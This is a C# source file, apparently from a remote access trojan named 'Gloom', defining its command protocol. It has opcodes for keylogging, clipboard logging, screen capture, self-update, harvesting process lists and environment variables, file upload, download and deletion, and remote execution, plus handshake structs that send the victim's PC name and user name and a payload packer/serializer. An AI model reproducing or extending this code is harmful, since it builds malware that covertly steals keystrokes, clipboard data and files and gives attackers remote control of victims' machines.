using System.Collections;
using System.Collections.Immutable;
using System.Runtime.InteropServices;
using System.Text;
using System.Xml;
using System.Xml.Serialization;
namespace Gloom;

/// <summary>
/// Payload opcode definitions.
/// </summary>
public static class OpCodes
{
	//public readonly static Guid HelloWorld = Guid.Parse("6694af3e-f1c6-4f05-a1ad-7fa6f12d2117");
	//public readonly static Guid Test = Guid.Parse("09a3e64a-f87a-48d6-9760-fd2d61bd31e5");

	#region Handshake
	public readonly static Guid ClientHandshake = Guid.Parse("033f8e43-ddee-4536-936e-71f94c599033");
	public readonly static Guid ServerHandshake = Guid.Parse("77b710eb-6507-4034-9ac6-c17d50e46b26");
	#endregion

	#region Global
	public static readonly Guid FeatureStateRequest = Guid.Parse("fa745c86-b8fb-4824-8e74-c38198ce7722");
	public static readonly Guid FeatureStateResponse = Guid.Parse("8b21ea64-0f91-45d2-88e2-2dbbb87d7249");
	#endregion

	#region KeyLogger
	public static readonly Guid KeyLoggerSettingRequest = Guid.Parse("965370b2-72de-468e-bcd8-2e953b45e82a");
	public static readonly Guid KeyLogRequest = Guid.Parse("58024ec1-4e1c-4890-a583-665248236da0");
	public static readonly Guid KeyLogResponse = Guid.Parse("0c78654f-9119-4177-8c9d-ab10e44925f6");
	#endregion

	#region ClipboardLogger
	public readonly static Guid ClipboardLogRequest = Guid.Parse("f9ddb84b-84b1-4d3f-9a43-51e8b1d386f8");
	public readonly static Guid ClipboardLogResponse = Guid.Parse("d4b0571b-7f54-4b25-8b7a-ee9e5d690fe8");
	public static readonly Guid ClipboardLoggerSettingRequest = Guid.Parse("e21f3180-54ff-4d77-a326-fb16c0173c58");
	#endregion

	#region ScreenCapturer
	public static readonly Guid ScreenCaptureListRequest = Guid.Parse("069a18b0-97f5-4aa6-88b9-1e844dae327f");
	public static readonly Guid ScreenCaptureListResponse = Guid.Parse("18fb03f0-cd5b-4c8c-aac0-7ce1faf7ad20");
	public static readonly Guid CurrentScreenRequest = Guid.Parse("948f99d0-3b3f-4dd2-8417-fd712d32e6ef");
	public static readonly Guid CurrentScreenResponse = Guid.Parse("4304b8aa-87db-4b62-955d-b9922153c1e3");
	public static readonly Guid ScreenCapturerSettingRequest = Guid.Parse("c2de9bc3-ba12-4a89-a8d5-a882e9d41aa4");
	#endregion

	#region SelfUpdater
	public static readonly Guid UpdateClientRequest = Guid.Parse("6eb58aa5-8b95-4e7e-b0ed-a08bde2adaf9");
	public static readonly Guid UpdateClientResponse = Guid.Parse("935399d2-ad8b-4c43-9441-9d506ecfd4c7");
	#endregion

	#region InfoCollector
	public static readonly Guid ProcessListRequest = Guid.Parse("80cc0886-dddc-4baa-adbf-045b14d3ab80");
	public static readonly Guid ProcessListResponse = Guid.Parse("564b544a-c12c-4f9a-92ee-f2c22cd07c79");
	public static readonly Guid EnvVarsRequest = Guid.Parse("07bbcff6-6c3f-4a9a-aefc-02349ef12c74");
	public static readonly Guid EnvVarsResponse = Guid.Parse("c6839ca1-c091-4a7d-9cfb-78ca0edf9900");
	#endregion

	#region FileIO
	public static readonly Guid DownloadFileRequest = Guid.Parse("c5c091c2-3605-4747-a84d-511c17f5fb23");
	public static readonly Guid DownloadFileResponse = Guid.Parse("5ee96e53-0841-4c2e-bbbe-d14bb230a6f6");
	public static readonly Guid UploadFileRequest = Guid.Parse("f628bc06-a615-46d5-b43f-3b7e8e33b8da");
	public static readonly Guid UploadFileResponse = Guid.Parse("bc4bba65-284c-4f39-9897-26ecb0cf307d");
	public static readonly Guid DeleteFileRequest = Guid.Parse("9b886262-191d-4b77-815b-00fe5d3dc090");
	public static readonly Guid DeleteFileResponse = Guid.Parse("1d4df5ea-7077-49df-a723-6bdaaa3835ca");
	#endregion

	#region Remote File Execution
	public static readonly Guid RemoteExecutionRequest = Guid.Parse("82e542e7-501f-474a-937b-4068628cd6c2");
	public static readonly Guid RemoteExecutionResponse = Guid.Parse("22728337-cebd-4bde-8cd6-434d0b8fb813");
	#endregion
}

public static class OpStructs
{
	#region Handshake
	[Serializable]
	public struct ClientHandshake
	{
		public string PcName;
		public string UserName;
		public byte[] PublicKey;
	}

	[Serializable]
	public struct ServerHandshake
	{
		public byte[] EncryptedSecret;
	}
	#endregion

	#region Global
	#endregion

	#region KeyLogger
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLoggerSettingRequest
	{
		public int Mode;
		public int SaveInterval;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLogRequest
	{
		public int LogCount;
	}

	[Serializable]
	public struct KeyLogResponse
	{
		public int LogIndex;
		public byte[] CompressedLog;
	}
	#endregion

	#region ClipboardLogger
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerRequest
	{
		public Guid RequestType;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerStateResponse
	{
		public bool Enabled;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLogResponse
	{
		public long TotalKeyStrokes;
		public byte[] CompressedKeyLog;
	}
	#endregion


	#region ScreenCapturer
	#endregion

	#region SelfUpdater
	#endregion

	#region InfoCollector
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ProcessListRequest
	{
	}

	[Serializable]
	public struct ProcessListResponse
	{
		public ProcessEntry[] List;
	}

	[Serializable]
	public struct ProcessEntry
	{
		public uint Pid;
		public string Name;
		public string CommandLine;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct EnvVarsRequest
	{
	}

	[Serializable]
	public struct EnvVarsResponse
	{
		public List<(string, string)> Map;
	}
	#endregion

	#region FileIO
	#endregion

	#region Remote File Execution
	#endregion
}

/// <summary>
/// Payload packer/unpacker.
/// </summary>
public static class PayloadEncoderExtension
{
	public static byte[] NewPayload(this Guid opGuid, byte[] data)
	{
		var payload = new byte[data.Length + 24]; // 8(Length) + 16(GUID) + n(Data)
		var lengthBytes = BitConverter.GetBytes(data.LongLength);
		Buffer.BlockCopy(lengthBytes, 0, payload, 0, 8);
		opGuid.TryWriteBytes(payload.AsSpan()[8..]);
		Buffer.BlockCopy(data, 0, payload, 24, data.Length);
		return payload;
	}

	public static long GetContentLength(this byte[] payload) => BitConverter.ToInt64(payload.AsSpan()[..8]);

	public static Guid GetGuid(this byte[] payload) => new(payload[8..24]);

	public static byte[] GetData(this byte[] payload) => payload[24..((int)payload.GetContentLength() + 24)];
}

/// <summary>
/// Simple .NET struct encoder/decoder.
/// https://kdsoft-zeros.tistory.com/25
/// </summary>
public static class StructConvert
{
	public static byte[] Struct2Bytes<T>(T obj) where T : struct => IsVariableSize<T>() ? VariableStruct2Bytes(obj) : FixedStruct2Bytes(obj);

	public static T Bytes2Struct<T>(byte[] buffer) where T : struct => IsVariableSize<T>() ? Bytes2VariableStruct<T>(buffer) : Bytes2FixedStruct<T>(buffer);

	private static bool IsVariableSize<T>() where T : struct => Attribute.IsDefined(typeof(T), typeof(SerializableAttribute));

	#region Fixed-size struct (de-)serializer - Fast but the size is fixed
	private static byte[] FixedStruct2Bytes<T>(T obj) where T : struct
	{
		var sz = Marshal.SizeOf(obj);
		var arr = new byte[sz];
		IntPtr ptr = Marshal.AllocHGlobal(sz);
		Marshal.StructureToPtr(obj, ptr, false);
		Marshal.Copy(ptr, arr, 0, sz);
		Marshal.FreeHGlobal(ptr);
		return arr;
	}

	private static T Bytes2FixedStruct<T>(byte[] buffer) where T : struct
	{
		var sz = Marshal.SizeOf(typeof(T));
		if (sz > buffer.Length)
			throw new ArgumentException("Type size larger than buffer size: type_size=" + sz + ", buffer_size=" + buffer.Length);
		IntPtr ptr = Marshal.AllocHGlobal(sz);
		Marshal.Copy(buffer, 0, ptr, sz);
		var obj = (T)Marshal.PtrToStructure(ptr, typeof(T))!;
		Marshal.FreeHGlobal(ptr);
		return obj;
	}
	#endregion

	#region Variable-size struct (de-)serializer with XMLSerializer - Slow but stable and more scalable
#if USE_BINARY_FORMATTER
	private static byte[] VariableStruct2Bytes<T>(T obj) where T : struct
	{
		using var ms = new MemoryStream();
		new BinaryFormatter().Serialize(ms, obj);
		return ms.ToArray();
	}

	private static T Bytes2VariableStruct<T>(byte[] buffer) where T : struct
	{
		using var ms = new MemoryStream(buffer);
		return (T)new BinaryFormatter().Deserialize(ms)!;
	}
#else
	private static byte[] VariableStruct2Bytes<T>(T obj) where T : struct
	{
		using var ms = new MemoryStream();
		using (var xw = XmlWriter.Create(ms, new XmlWriterSettings { Encoding = new UTF8Encoding(false), Indent = false, OmitXmlDeclaration = true }))
		{
			var serializer = new XmlSerializer(typeof(T));
			serializer.Serialize(xw, obj);
		}
		return ms.ToArray();
	}

	private static T Bytes2VariableStruct<T>(byte[] buffer) where T : struct
	{
		Console.WriteLine("Destruct " + Encoding.UTF8.GetString(buffer));
		using var ms = new MemoryStream(buffer);
		var serializer = new XmlSerializer(typeof(T));
		return (T)serializer.Deserialize(ms)!;
	}
#endif
	#endregion
}
